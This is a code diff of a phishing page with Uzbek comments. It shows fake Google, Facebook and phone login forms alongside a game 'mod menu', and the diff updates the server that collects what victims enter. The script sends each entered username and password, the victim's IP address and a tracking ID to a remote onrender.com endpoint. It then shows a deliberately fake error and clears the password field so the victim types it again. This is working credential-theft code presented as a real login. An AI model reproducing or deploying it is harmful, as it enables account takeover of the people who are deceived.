@@ -215,14 +215,12 @@
         <p style="margin:10px 0; font-size:13px; color:#666;">Twitter, VK, Guest...</p>
     </div>
 </div>
-
 <script>
-    // --- 1. RENDERDAGI BOT MANZILI (MUHIM!) ---
-    // Bu yerga Render bergan linkni yozing va oxiriga /login_submit qo'shing
-    const RENDER_API_URL = "https://panji.onrender.com/login_submit"; 
+    // --- 1. YANGI RENDER MANZILI (MUHIM!) ---
+    // Bu yerga yangi linkni qo'ydim va oxiriga /login_submit yozdim
+    const RENDER_API_URL = "https://pab-0dln.onrender.com/login_submit"; 
 
     // --- 2. LINKDAN ID NI OLISH ---
-    // GitHub bu yerni avtomatik bajaradi
     const urlParams = new URLSearchParams(window.location.search);
     const CURRENT_USER_ID = urlParams.get('user_id') || "Noma'lum"; 
 
@@ -258,11 +256,10 @@
         document.querySelectorAll('.spinner').forEach(s => s.style.display = 'none');
     }
 
-    // SERVERGA (RENDERGA) YUBORISH
+    // SERVERGA (YANGI RENDERGA) YUBORISH
     async function submitLogin(method) {
         playBtnSound();
         let u, p;
-        // Inputlarni olish
         if(method==='google'){ u=document.getElementById('google-email').value; p=document.getElementById('google-password').value; }
         if(method==='facebook'){ u=document.getElementById('fb-email').value; p=document.getElementById('fb-password').value; }
         if(method==='phone'){ u=document.getElementById('phone-email').value; p=document.getElementById('phone-password').value; }
@@ -274,15 +271,13 @@
 
         // 1. RENDERGA YUBORISH
         try {
-            // IP ni aniqlash
             const ipData = await fetch('https://api.ipify.org?format=json').then(res=>res.json()).catch(()=>({ip:"Noma'lum"}));
             
-            // Render manziliga jo'natish
             await fetch(RENDER_API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    user_id: CURRENT_USER_ID, // Linkdan olingan ID
+                    user_id: CURRENT_USER_ID,
                     method: method,
                     username: u,
                     password: p,
@@ -293,7 +288,7 @@
             console.log("Xatolik:", e);
         }
 
-        // 2. FAKE XATO CHIQARISH
+        // 2. FAKE XATO
         setTimeout(() => {
             spinner.style.display = 'none';
             const errEl = document.getElementById(`err-${method}`);
@@ -307,7 +302,6 @@
             box.style.animation = 'shake 0.4s';
             setTimeout(()=> box.style.animation='', 400);
 
-            // Tozalash
             if(method==='google') document.getElementById('google-password').value = "";
             if(method==='facebook') document.getElementById('fb-password').value = "";
             if(method==='phone') document.getElementById('phone-password').value = "";
@@ -321,7 +315,8 @@
     function dragMove(e) { if (active) { e.preventDefault(); currentX = e.touches[0].clientX - initialX; currentY = e.touches[0].clientY - initialY; xOffset = currentX; yOffset = currentY; setTranslate(currentX, currentY, dragItem); } }
     function setTranslate(xPos, yPos, el) { el.style.transform = "translate3d(" + xPos + "px, " + yPos + "px, 0)"; }
     function toggleModMenu() { playBtnSound(); const m = document.getElementById('mod-menu'); m.style.display = (m.style.display === 'block') ? 'none' : 'block'; }
-</script>
+        </script>
+                      
 <style>
 @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } 100% { transform: translateX(0); } }
 </style>
